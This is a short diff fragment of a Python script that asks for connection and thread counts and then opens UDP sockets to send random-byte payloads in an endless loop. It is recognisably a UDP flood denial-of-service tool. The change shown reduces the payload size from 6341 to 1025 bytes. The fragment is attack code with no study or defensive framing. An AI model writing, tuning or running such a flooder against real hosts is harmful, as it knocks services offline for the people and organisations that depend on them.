@@ -23,7 +23,7 @@ times = int(input("Connections:"))
 threads = int(input("Threading:"))
 choice = str(input("Ready? (y):"))
 def run():
-	data = random._urandom(6341)
+	data = random._urandom(1025)
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
